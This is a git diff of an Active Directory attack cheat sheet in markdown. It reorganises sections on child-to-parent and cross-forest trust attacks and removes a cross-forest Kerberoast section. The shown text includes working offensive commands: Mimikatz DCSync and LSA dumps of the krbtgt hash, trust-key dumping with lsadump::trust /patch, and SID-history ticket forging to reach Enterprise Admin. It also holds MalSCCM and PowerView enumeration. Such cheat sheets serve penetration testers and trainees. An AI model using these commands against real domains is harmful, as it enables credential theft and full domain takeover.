@@ -63,22 +63,19 @@
   * [SQL Queries](#SQL-Queries)
 * [WSUS](#Attacking-WSUS)
 * [SCCM](#SCCM)
-* [Cross Domain attacks](#Cross-Domain-attacks)
-  * [Kerberoast](#Kerberoast)
-  * [MS Exchange](#MS-Exchange)
+* [Child to Parent](#Child-to-Parent)
+  * [Kerberos](#Kerberos)
   * [Azure AD](#Azure-AD)
   * [SQL Server](#SQL-Server)
-  * [Child to Forest Root](#Child-to-Forest-Root)
-    * [Trust key](#Trust-key)
-    * [Krbtgt hash](#Krbtgt-hash)
+  * [Trust key](#Trust-key)
+  * [Krbtgt hash](#Krbtgt-hash)
 * [Cross Forest attacks](#Crossforest-attacks)
+  * [Kerberos](#Kerberos)
+  * [SQL Server](#SQL-Server)
   * [One-way Outbound](#One-way-Outbound)
-  * [Kerberoast](#Kerberoast2)
   * [Printer Bug](#Printer-bug2) 
   * [Trust key](#Trust-key2) 
-  * [SQL Server](#SQL-Server)
   * [Foreign Security Principals](#Foreign-Security-Principals)
-  * [ACLs](#ACLs)
   * [Pam Trust](#Pam-Trust)
   * [RDPInception](#RDPInception)
 
@@ -2276,8 +2273,12 @@ MalSCCM.exe inspect /primaryusers
 MalSCCM.exe inspect /groups
 ```
  
-## Cross Domain attacks
-## Azure AD
+## Child to Parent
+### Kerberos
+- Anything related to Kerberos and users/groups etc could be performed from child to parent. Things like Roasting, password in description, anything related to attributes, ACL's etc etc!
+- Use the `-Domain` flag in PowerView to query stuff cross domain/forest.
+
+### Azure AD
 #### Enumerate where PHS AD connect is installed
 ```
 Get-DomainUser -Identity "MSOL_*" -Domain <DOMAIN>
@@ -2299,9 +2300,10 @@ runas /user:<DOMAIN>\<USER> /netonly cmd
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
 
-## Child to Forest Root
 ### Trust key
 - Abuses SID History
+- Requires `Domain Admin` privileges in child domain.
+
 #### Dump trust keys
 - Look for in trust key from child to parent (first command)
 - The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
@@ -2339,6 +2341,8 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 
 ### Krbtgt hash
 - Abuses SID History
+- Requires `Domain Admin` privileges in child domain.
+
 #### Get krbtgt hash from dc
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <DC>
@@ -2389,15 +2393,6 @@ mimikatz lsadump::trust /patch
 ```
 
 #### Then inject TGT and you can enumerate the other domain for kerberos vulnerabilities etc.
-
-### Kerberoast2
-#### Enumerate users with SPN cross-forest
-```
-Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName} 
-```
-
-#### Request and crack TGS see:
-See [Kerberoast](#Kerberoast) 
 
 ### Printer bug2
 -  It also works across a Two-way forest trust if TGT Delegation is enabled!
